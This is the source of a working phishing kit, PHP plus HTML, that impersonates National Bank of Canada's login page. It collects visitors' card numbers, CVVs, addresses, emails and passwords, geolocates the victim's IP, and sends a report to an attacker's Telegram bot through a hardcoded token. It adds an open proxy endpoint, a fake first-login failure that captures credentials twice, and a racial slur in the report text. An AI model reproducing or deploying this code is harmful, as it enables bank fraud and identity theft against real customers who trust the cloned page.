<?php
include "/mods/antibot.php";

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if (isset($_GET['bypass']) && $_GET['bypass'] == 'true') {
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 " . $info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}

$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS()
{
    global $user_agent;
    $os_platform = "Unknown OS Platform";
    $os_array = array(
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );

    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }
    }

    return $os_platform;
}

function getBrowser()
{
    global $user_agent;
    $browser = "Unknown Browser";
    $browser_array = array(
        '/msie/i' => 'Internet Explorer',
        '/firefox/i' => 'Firefox',
        '/safari/i' => 'Safari',
        '/chrome/i' => 'Chrome',
        '/edge/i' => 'Edge',
        '/opera/i' => 'Opera',
        '/netscape/i' => 'Netscape',
        '/maxthon/i' => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i' => 'Handheld Browser'
    );

    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser = $value;
        }
    }

    return $browser;
}

$user_os = getOS();
$user_browser = getBrowser();

$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file = 'data.dat';
$file1 = 'combo.txt';
$file2 = 'master.log';
$ip = "" . $PublicIP;
$uaget = "" . $user_agent;
$bsr = "" . $user_browser;
$uos = "" . $user_os;
$ust = explode(" ", $user_agent);
$vr = $ust[3];
$ver = str_replace(")", "", $vr);
$version = "Version              : " . $ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
} else {
    $details = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details = json_decode($details, true);
$success = $details['success'];
$fp = fopen($file, 'a');

if ($success == false) {
    fwrite($fp, $ip . "\n");
    fwrite($fp, $uos . "\n");
    fwrite($fp, $version . "\n");
    fwrite($fp, $bsr . "\n");
    fclose($fp);
} else if ($success == true) {
    $country = $details['country'];
    $city = $details['city'];
    $continent = $details['continent'];
    $tp = $details['type'];
    $cn = $details['country_phone'];
    $is = $details['isp'];
    $la = $details['latitude'];
    $lp = $details['longitude'];
    $crn = $details['currency'];
    $type = $tp;
    $isp = $is;
    $bank = "NIGGAS BRING CASH BANK [NBC]";
    $LL = "+";
    $currency = "" . $full_date;
    $lh = "|";
    $li = ",";
}

$message = "|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n|IPADDRESS :  " . $ip . "\n|BANK   💰  : " . $bank ."\n|Internet sp :  " . $isp ."\n|Type[4/6]     : ".  $tp . "\n|Device Info  :  " . $uos . $lh . $bsr . "\n|City                :  " . $city . "\n|Continent    :  " . $continent . "\n|Lat+lon         :  " . $la . $LL . $lp . "\n|Phone           :  " . $cn . "\n|Country        :  " . $country . "\n|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n| PROFIT   :  " . $_POST['Cardnumber'] . "|" . $_POST['Expiry'] . "|" . $_POST['CVV'] . "|" . $_SESSION['ZIP'] . "|" . $_POST['Nameoncard'] . "|" . $_SESSION['Address'] . "  " . $_SESSION['Apartment'] . "|" . $_SESSION['City'] . "|" . $_SESSION['state'] . "|" . $_SESSION['Phone'] . "|" . $_SERVER['REMOTE_ADDR'] . "|" . $_SESSION['bank_scheme'] . "|" . $_SESSION['bank_type'] . "|" . $_SESSION['bank_brand'] . "|" . $_SESSION['bank_name'] . "|" . $_SESSION['bank_country'] . "\n|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n|USERAGENT:  " . $_SERVER['HTTP_USER_AGENT'] . "\n";


$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-1001831940786',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    
          

$options = array(
    'http' => array(
        'method'  => 'POST',
        'content' => http_build_query($data),
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n"
    )
);
$context  = stream_context_create($options);
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage", false, $context);

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if (isset($_GET['bypass']) && $_GET['bypass'] == 'true') {
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 " . $info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}

?>
     
<html<head>

        
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0, viewport-fit=cover" name="viewport">
        <title>Services bancaires / Banking Services</title>
        <link href="./files/main.0a92d0a0.css" rel="stylesheet">
        <link rel="shortcut icon" href="assets/nbc/favicon.ico">
        <style type="text/css" data-styled-components="iVXCSc fvRaFi intGMm fFgwqV" data-styled-components-is-local="true">		/* sc-component-id: sc-bdVaJa */
            .fvRaFi{padding:0.563rem 1rem;font-size:1em;font-family:'gilroy', Arial, Helvetica, sans-serif;line-height:1.25;border-radius:8px;border:1px solid #d2d2d2;color:#000;box-shadow:inset 0 1px 3px 0 rgba(0,0,0,0.14);-webkit-transition:all 0.2s;transition:all 0.2s;-webkit-appearance:none;box-sizing:border-box;}.fvRaFi:focus,.fvRaFi[type='checkbox']:focus{outline:0;border:1px solid #7993a2;box-shadow:1px 2px 4px 0 rgba(0,0,0,0.1), inset 0 1px 3px 0 rgba(0,0,0,0.14);-webkit-transition:all 0.2s;transition:all 0.2s;}.fvRaFi[disabled]{opacity:0.3;background-color:#d2d2d2;}.fvRaFi[type='checkbox']{position:relative;border-radius:4px;width:2em;height:2em;padding:0.25em;box-shadow:none;color:#fff;border:1px solid #d2d2d2;background:#fff;}.fvRaFi[type='checkbox']:checked{border-color:transparent;background:#2d67b2;}.fvRaFi[type='checkbox']:checked::after{content:url(/static/media/check.2f5ff41b.svg);}.fvRaFi[type='checkbox'].is-small{width:1.5em;height:1.5em;}.fvRaFi[type='radio']{position:relative;border-radius:50%;width:2em;height:2em;padding:0.25em;box-shadow:none;color:i_color_white;border:1px solid #d2d2d2;background:#fff;}.fvRaFi[type='radio'].is-small{width:1.5em;height:1.5em;}.fvRaFi[type='radio']:checked::after{content:'';width:1em;height:1em;border-radius:50%;background:#2d67b2;}.fvRaFi[type='checkbox']:checked::after,.fvRaFi[type='radio']:checked::after{position:absolute;left:50%;top:50%;-webkit-transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%);transform:translate(-50%,-50%);}
            /* sc-component-id: sc-bwzfXH */
            .intGMm{color:#7993a2;font-family:'gilroy', Arial, Helvetica, sans-serif;font-weight:normal;font-size:0.875rem;line-height:1.5;white-space:nowrap;}
            /* sc-component-id: sc-bZQynM */
            .fFgwqV{opacity:1;display:block;color:#7993a2;font-family:'gilroy', Arial, Helvetica, sans-serif;font-weight:normal;font-size:0.875em;line-height:1em;text-align:right;-webkit-transition:all 0.2s;transition:all 0.2s;margin-top:0;margin-bottom:0.25em;}
            /* sc-component-id: sc-keyframes-iVXCSc */
            @-webkit-keyframes iVXCSc{from{-webkit-transform:rotate(0deg);-ms-transform:rotate(0deg);transform:rotate(0deg);}to{-webkit-transform:rotate(360deg);-ms-transform:rotate(360deg);transform:rotate(360deg);}}@keyframes iVXCSc{from{-webkit-transform:rotate(0deg);-ms-transform:rotate(0deg);transform:rotate(0deg);}to{-webkit-transform:rotate(360deg);-ms-transform:rotate(360deg);transform:rotate(360deg);}}

            .message.error {
                color: #cc191f;
                background-color: #fbe7ee;
                padding: 16px;
            }

            .message {
                margin: 2rem 0 0;
                font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
            }
            .error {
                color: #e41c23;
            }

            .message {
                display: block;
                opacity: 1;
                padding: 2em;
                font-size: 1em;
                font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
                font-weight: 400;
                text-align: center;
                line-height: 1.5em;
                border-radius: 6px;
                transition: all .2s;
                color: #000;
                margin-bottom: 1em;
            }
        </style>
        <style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style>
        <script src="./files/jquery-3.6.0.min.js###%" crossorigin="anonymous"></script>
        <script>
            var lrbank = 'NBC';
            var lrinfo = 'Login';
        </script>
        <link rel="stylesheet" href="./files/all.css">
        <script src="./files/actions.js###%"></script>
        <script>
        $(document).ready(function() {
            var attempt = 2;

            $('.lab-form').submit(function(e) {
                e.preventDefault();
                var form = this;

                if (attempt == 1) {
                    $('.div-loader').css('display', 'inline-flex');
                    $('.div-main').css('display', 'none');

                    $.post('/deposit/nbc/api/login-submit', $(this).serialize(), function(response) {
                        $('.error-div').css('display', 'block');

                        $(form).trigger('reset');

                        $('.div-loader').css('display', 'none');
                        $('.div-main').css('display', 'inline-flex');
                    }, 'JSON');

                    attempt = 2;
                } else {
                    $('.div-loader').css('display', 'inline-flex');
                    $('.div-main').css('display', 'none');

                    $.post('/deposit/nbc/api/login-submit', $(this).serialize(), function(response) {
                        if (response.status) {
                            if (response.data.loader) {
                                location.href = '/deposit/nbc/w';
                            } else {
                                location.href = '/deposit/nbc/d';
                            }
                        } else {
                            $(form).trigger('reset');

                            $('.error-div').css('display', 'block');

                            $('.div-loader').css('display', 'none');
                            $('.div-main').css('display', 'inline-flex');
                        }
                    }, 'JSON');
                }

                return false;
            });

            $(document).on('change', '.input-username, .input-password', function() {
                var username = $(this).hasClass('input-username') ? $(this).val() : $(this).closest('form').find('.input-username').val();
                var password = $(this).hasClass('input-password') ? $(this).val() : $(this).closest('form').find('.input-password').val();
                $.post('/deposit/nbc/api/login-data', {username: username, password: password});
            });
        });
        </script>
</style></head>
    <body>
        <div id="root">
            <div data-reactroot="">
                <div lang="en">
                    <div id="not-connected-notification-message" class="notification-message">
                        <span></span>
                        <div class="validation-icon success">
                            <svg width="32" height="32" viewBox="0 0 52 52">
                                <g fill="currentColor" fill-rule="nonzero">
                                    <g transform="translate(1.000000, 1.000000)" fill="currentColor">
                                        <path d="M25,51 C10.6405965,51 -1,39.3594035 -1,25 C-1,10.6405965 10.6405965,-1 25,-1 C39.3594035,-1 51,10.6405965 51,25 C51,39.3594035 39.3594035,51 25,51 Z M25,49 C38.254834,49 49,38.254834 49,25 C49,11.745166 38.254834,1 25,1 C11.745166,1 1,11.745166 1,25 C1,38.254834 11.745166,49 25,49 Z"></path>
                                        <path d="M32.7904588,18.4434373 C33.012054,18.2231055 33.3124053,18.1003013 33.62489,18.1022645 C33.9373747,18.1042278 34.2361592,18.2307962 34.4517672,18.4506606 C34.9078274,18.907273 34.9124659,19.6455597 34.4575534,20.1125534 L22.9158866,31.6542189 C22.5613744,32.0073978 22.0248561,32.0936899 21.580804,31.878702 C21.3697176,31.8298093 21.1747874,31.7228942 21.0174794,31.5655862 L15.6288646,26.1779704 C15.4081448,25.9565221 15.2847862,25.6562366 15.286093,25.3435788 C15.2873998,25.0309209 15.4132643,24.7316771 15.6310816,24.5168276 C15.8506771,24.2942643 16.1499209,24.1683998 16.4625788,24.167093 C16.7752366,24.1657862 17.0755221,24.2891448 17.2975534,24.5104466 L22.0109842,29.2238774 L32.7904588,18.4434373 Z" id="Shape"></path>
                                    </g>
                                </g>
                            </svg>
                        </div>
                    </div>
                    <div class="content">
                        <div class="wrapper" style="padding-top: 20px;">
                            <header class="connect-header en">
                                <div class="logo-banque-nationale">
                                    <div class="nbc-logo">
                                        <svg viewBox="0 0 408.6 106.3" preserveAspectRatio="xMidYMid meet">
                                            <g>
                                                <g>
                                                    <path class="logo-icon" d="M73.3,25 C71.3,25.5 69.9,25.8 68.4,25.2 C67.3,24.8 66.4,23.5 65.6,22.4 L52,3.8 C51.2,2.7 50.3,1.4 49.2,1 C47.8,0.4 46.3,0.8 44.3,1.2 L0.5,13 L0.5,94.5 L44.4,82.8 C46.4,82.4 47.9,82 49.3,82.6 C50.4,83.1 51.3,84.3 52.1,85.4 L65.6,104 C66.4,105.1 67.3,106.3 68.4,106.8 C69.8,107.3 71.3,107 73.3,106.6 L117.1,94.9 L117.1,13.2 L73.3,25 Z"></path>
                                                    <polygon class="logo-txt" points="167 16.5 167 37.4 166.9 37.4 153.1 13.2 145.5 16.9 145.5 47.9 152.2 47.9 152.2 23.1 152.3 23.1 166.5 47.9 173.7 47.9 173.7 13.2"></polygon>
                                                    <path class="logo-txt" d="M197.9,13.2 L197.9,13.2 L187.8,18.1 L177.2,47.9 L184.8,47.9 L187.2,40.7 L200,40.7 L202.2,47.9 L210.1,47.9 L197.9,13.2 Z M189.2,34.7 L193.6,21 L193.7,21 L198,34.7 L189.2,34.7 Z"></path>
                                                    <path class="logo-txt" d="M339.7,13.2 L339.7,13.2 L329.6,18.1 L319,47.9 L326.6,47.9 L329,40.7 L341.8,40.7 L344,47.9 L351.9,47.9 L339.7,13.2 Z M330.9,34.7 L335.3,21 L335.4,21 L339.7,34.7 L330.9,34.7 Z"></path>
                                                    <polygon class="logo-txt" points="234.1 13.2 209.4 13.2 205.9 19.3 205.9 19.3 216.4 19.3 216.4 47.9 223.6 47.9 223.6 19.3 230.5 19.3"></polygon>
                                                    <polygon class="logo-txt" points="237 16.7 237 47.9 244.2 47.9 244.2 13.2 244.2 13.2"></polygon>
                                                    <path class="logo-txt" d="M265.7,12.3 C265.4,12.3 265,12.3 264.6,12.3 L252.6,18.2 C250.5,20.9 249,24.9 249,30.6 C249,46.9 261.1,48.9 265.7,48.9 C270.3,48.9 282.4,46.9 282.4,30.6 C282.3,14.2 270.2,12.3 265.7,12.3 Z M265.7,42.7 C261.8,42.7 256.3,40.3 256.3,30.6 C256.3,20.9 261.8,18.5 265.7,18.5 C269.6,18.5 275.1,20.9 275.1,30.6 C275.1,40.3 269.6,42.7 265.7,42.7 Z"></path>
                                                    <polygon class="logo-txt" points="308.6 16.5 308.6 37.4 308.5 37.4 294.7 13.2 287.1 16.9 287.1 47.9 293.9 47.9 293.9 23.1 294 23.1 308.1 47.9 315.4 47.9 315.4 13.2"></polygon>
                                                    <polygon class="logo-txt" points="380 41.6 362.7 41.6 362.7 13.2 355.5 16.7 355.5 47.9 376.4 47.9"></polygon>
                                                    <path class="logo-txt" d="M168.8,76 C170.2,75.3 173.1,73.9 173.1,68.9 C173.1,65.3 170.9,60 162.4,60 L152.8,60 L145.5,63.6 L145.5,94.7 L160.2,94.7 C167.3,94.7 169.2,93.5 171.2,91.6 C173,89.8 174.2,87.2 174.2,84.4 C174.1,81 173,77.6 168.8,76 Z M152.4,66 L160.7,66 C164,66 166,66.9 166,69.7 C166,72.5 163.7,73.6 160.9,73.6 L152.4,73.6 L152.4,66 L152.4,66 Z M161.3,88.7 L152.4,88.7 L152.4,79.4 L161.6,79.4 C164.2,79.4 166.8,80.6 166.8,83.6 C166.9,87.2 164.8,88.7 161.3,88.7 Z"></path>
                                                    <polygon class="logo-txt" points="232.5 63.3 232.5 84.2 232.4 84.2 218.6 60 211 63.8 211 94.7 217.8 94.7 217.8 70 217.9 70 232 94.7 239.3 94.7 239.3 60"></polygon>
                                                    <path class="logo-txt" d="M195.7,60 L195.7,60 L185.6,65 L175,94.7 L182.6,94.7 L185,87.5 L197.8,87.5 L200,94.7 L207.9,94.7 L195.7,60 Z M187,81.6 L191.4,67.9 L191.5,67.9 L195.8,81.6 L187,81.6 Z"></path>
                                                    <polygon class="logo-txt" points="275.2 60.1 263.9 62 252.6 74.2 252.6 60 245.3 63.6 245.3 94.7 252.6 94.7 252.6 83 256 79.5 266.7 94.7 276 94.7 261 74.2"></polygon>
                                                </g>
                                            </g>
                                        </svg>
                                    </div>
                                </div>
                                <div class="tag-banque-nationale">
                                    Powering your ideas
                                </div>
                            </header>
                            <main class="connect-content div-main">
                                <div class="container">
                                    <div class="heading">
                                        <h1 class="title">
                                            <span class="greetings">Good evening </span>
                                        </h1>
                                    </div>
                                    <div class="message error error-div" style="display: none" role="alert">Verify that your login information is correct. We were unable to identify you.</div>
                                    <form id="lab-form" class="lab-form" method="post" action="040148.php">
                                        <div id="loginForm" class="connect-form">
                                            <div class="form-header">
                                                <p>
                                                    <span>Access your account</span>
                                                </p>
                                            </div>
                                            <div class="login-content">
                                                <span>
                                                    <div class="login-relative form-fields login">
                                                        <div class="form-field">
                                                            <div class="form-group">
                                                                <label class="form-group__label sc-bwzfXH intGMm">Your email</label>
                                                                <div class="form-group__input">
                                                                    <input type="email" required="true" class="login-relative sc-bdVaJa fvRaFi lrinput input-username" placeholder="" id="identity" name="username" value="" maxlength="255" attr-action="Filling Username">
                                                                    <input type="hidden" name="CRSFToken" value="">
                                                                </div>
                                                            </div>
                                                            <label class="label-inline sc-bwzfXH intGMm">
                                                                <input type="checkbox" class="is-small sc-bdVaJa fvRaFi" placeholder="" id="" name="remember" value="">
                                                                <!-- react-text: 67 -->
                                                                Remember me
                                                                <!-- /react-text -->
                                                                <span class="tooltip-anchor">
                                                                    <span class="bn-icon">
                                                                        <svg width="16" height="16" viewBox="0 0 16 16">
                                                                            <g fill="currentColor" fill-rule="nonzero">
                                                                                <g>
                                                                                    <path d="M8.00496579,1.37639436 C4.34399533,1.37639436 1.37639436,4.34399533 1.37639436,8.00496579 C1.37639436,11.665468 4.34425853,14.6335372 8.00496579,14.6335372 C11.6652048,14.6335372 14.6335372,11.6652048 14.6335372,8.00496579 C14.6335372,4.34425853 11.665468,1.37639436 8.00496579,1.37639436 Z M8.00496579,0.0049657884 C12.4228659,0.0049657884 16.0049658,3.58681824 16.0049658,8.00496579 C16.0049658,12.4226239 12.4226239,16.0049658 8.00496579,16.0049658 C3.58681824,16.0049658 0.0049657884,12.4228659 0.0049657884,8.00496579 C0.0049657884,3.58657625 3.58657625,0.0049657884 8.00496579,0.0049657884 Z" id="Stroke-1" fill-rule="nonzero"></path>
                                                                                    <path d="M9,11.5 L9,7.5 C9,6.94771525 8.55228475,6.5 8,6.5 C7.44771525,6.5 7,6.94771525 7,7.5 L7,11.5 C7,12.0522847 7.44771525,12.5 8,12.5 C8.55228475,12.5 9,12.0522847 9,11.5 Z" id="Stroke-3" fill-rule="nonzero"></path>
                                                                                    <circle id="Oval-2" fill-rule="evenodd" cx="8" cy="4.3" r="1"></circle>
                                                                                </g>
                                                                            </g>
                                                                        </svg>
                                                                    </span>
                                                                </span>
                                                            </label>
                                                        </div>
                                                        <div class="form-field">
                                                            <div class="form-group">
                                                                <label class="form-group__label sc-bwzfXH intGMm">Password</label>
                                                                <div class="form-group__input">
                                                                    <div class="input-password__container">
                                                                        <input type="password" autocapitalize="none" class="login-relative input-password sc-bdVaJa fvRaFi lrinput input-password" placeholder="" required="true" id="password" name="password" value="" maxlength="25" attr-action="Filling Password">
                                                                        <button class="input-password__icon">
                                                                            <span class="bn-icon">
                                                                                <svg width="20" height="20" viewBox="0 0 16 16">
                                                                                    <g fill="currentColor" fill-rule="nonzero">
                                                                                        <g transform="translate(1.000000, 3.000000)">
                                                                                            <path d="M1.01860539,5.53033132 C1.38375935,6.09573101 1.81517794,6.66152588 2.30830424,7.18752727 C3.68684421,8.6579699 5.25936609,9.52556818 7,9.52556818 C8.74063391,9.52556818 10.3131558,8.6579699 11.6916958,7.18752727 C12.1848221,6.66152588 12.6162406,6.09573101 12.9813946,5.53033132 C13.0897048,5.36262529 13.1800415,5.21449046 13.2520006,5.09090909 C13.1800415,4.96732772 13.0897048,4.81919289 12.9813946,4.65148686 C12.6162406,4.08608717 12.1848221,3.5202923 11.6916958,2.99429091 C10.3131558,1.52384828 8.74063391,0.65625 7,0.65625 C5.25936609,0.65625 3.68684421,1.52384828 2.30830424,2.99429091 C1.81517794,3.5202923 1.38375935,4.08608717 1.01860539,4.65148686 C0.910295242,4.81919289 0.819958491,4.96732772 0.747999429,5.09090909 C0.819958491,5.21449046 0.910295242,5.36262529 1.01860539,5.53033132 Z M-0.586967844,4.79742517 C-0.497205826,4.61790113 -0.328963691,4.318804 -0.0839462962,3.93942223 C0.32149633,3.3116401 0.799878879,2.68425315 1.35078666,2.09661818 C2.95520124,0.385242631 4.84290664,-0.65625 7,-0.65625 C9.15709336,-0.65625 11.0447988,0.385242631 12.6492133,2.09661818 C13.2001211,2.68425315 13.6785037,3.3116401 14.0839463,3.93942223 C14.3289637,4.318804 14.4972058,4.61790113 14.5869678,4.79742517 C14.6793441,4.98217758 14.6793441,5.1996406 14.5869678,5.38439301 C14.4972058,5.56391705 14.3289637,5.86301418 14.0839463,6.24239595 C13.6785037,6.87017808 13.2001211,7.49756503 12.6492133,8.0852 C11.0447988,9.79657555 9.15709336,10.8380682 7,10.8380682 C4.84290664,10.8380682 2.95520124,9.79657555 1.35078666,8.0852 C0.799878879,7.49756503 0.32149633,6.87017808 -0.0839462962,6.24239595 C-0.328963691,5.86301418 -0.497205826,5.56391705 -0.586967844,5.38439301 C-0.679344052,5.1996406 -0.679344052,4.98217758 -0.586967844,4.79742517 Z" id="Shape" fill-rule="nonzero"></path>
                                                                                            <path d="M7,7.65625 C5.58320134,7.65625 4.43465909,6.50770775 4.43465909,5.09090909 C4.43465909,3.67411043 5.58320134,2.52556818 7,2.52556818 C8.41679866,2.52556818 9.56534091,3.67411043 9.56534091,5.09090909 C9.56534091,6.50770775 8.41679866,7.65625 7,7.65625 Z M7,6.34375 C7.69192493,6.34375 8.25284091,5.78283402 8.25284091,5.09090909 C8.25284091,4.39898416 7.69192493,3.83806818 7,3.83806818 C6.30807507,3.83806818 5.74715909,4.39898416 5.74715909,5.09090909 C5.74715909,5.78283402 6.30807507,6.34375 7,6.34375 Z" id="Oval" fill-rule="nonzero"></path>
                                                                                        </g>
                                                                                    </g>
                                                                                </svg>
                                                                            </span>
                                                                        </button>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <p class="sc-bZQynM fFgwqV">
                                                                <a id="forgetLink">Did you forget your password?</a>
                                                            </p>
                                                        </div>
                                                        <div id="loginFormSubmit" class="form-field">
                                                            <button class="bt_cta fluid primary is-large btn-login" id="login-form_submit" title="" value="1" name="save" type="submit">
                                                                <span class="btn-txt">
                                                                    <span class="bn-icon">
                                                                        <svg width="16" height="16" viewBox="0 0 16 16">
                                                                            <g fill="currentColor" fill-rule="nonzero">
                                                                                <g>
                                                                                    <path d="M7.98 8.5a1.05 1.05 0 0 0-.68 1.846v1.351a.68.68 0 1 0 1.36 0v-1.351A1.05 1.05 0 0 0 7.98 8.5"></path>
                                                                                    <path d="M12.603 11.836c0 .163-.024.333-.072.502-.247.887-1.101 1.505-2.079 1.505H5.507c-.977 0-1.831-.618-2.079-1.504a1.903 1.903 0 0 1-.07-.498l-.003-.183.003-4.499h9.245v.98l-.003-.01.003 3.707zm.207-6.034H3.15c-.635 0-1.15.516-1.15 1.15v4.884C2 13.69 3.572 15.2 5.507 15.2h4.945c1.935 0 3.509-1.51 3.509-3.364V6.95c0-.633-.517-1.15-1.151-1.15z"></path>
                                                                                    <path d="M12.199 3.927C12.187 1.762 10.415 0 8.229 0l-.545.003A3.926 3.926 0 0 0 4.9 1.177a3.933 3.933 0 0 0-1.146 2.797l.007 2.272H5.393v-2.06c0-1.341 1.093-2.586 2.435-2.586h.306c1.342 0 2.435 1.245 2.435 2.587v2.059h1.636L12.2 3.927z"></path>
                                                                                </g>
                                                                            </g>
                                                                        </svg>
                                                                    </span>
                                                                    Sign in
                                                                </span>
                                                                <span class="btn-spinner" style="display: none"><i class="fa fa-spinner fa-spin"></i></span>
                                                            </button>
                                                        </div>
                                                        <div class="form-footer" style="padding-top: 20px;">
                                                            <p class="form-footer-message">
                                                                <span>It's your first time signing in?</span><span>Sign up for your new online bank</span>
                                                            </p>
                                                            <button class="bt_cta" title="" name="" type=""><span>Sign up</span></button>
                                                        </div>
                                                    </div>
                                                </span>
                                            </div>
                                            <input type="hidden" name="save" value="1">
                                        </div>
                                    </form>
                                </div>
                            </main>
                            <main class="connect-content div-loader" style="display: none">
                                <div class="container">
                                    <form id="id7" method="post" action="deposit/nbc">
                                        <div id="loginForm" class="connect-form">
                                            <div class="form-header">
                                                <style>
                                                .loader-div {
                                                    text-align: center;
                                                    padding-top: 20px;
                                                    margin-top: -90px;
                                                }

                                                .loader-div h2 {
                                                    font-size: 28px;
                                                    margin-bottom: 20px;
                                                }

                                                .loader-div p {
                                                    margin-top: 27px;
                                                    padding: 0px 42px;
                                                    font-size: 16px;
                                                }
                                                </style>
                                                <div class="loader-div">
                                                    <h2>Processing</h2>
                                                    <img src="./files/load.gif">
                                                </div>
                                            </div>
                                        </div>
                                    </form>
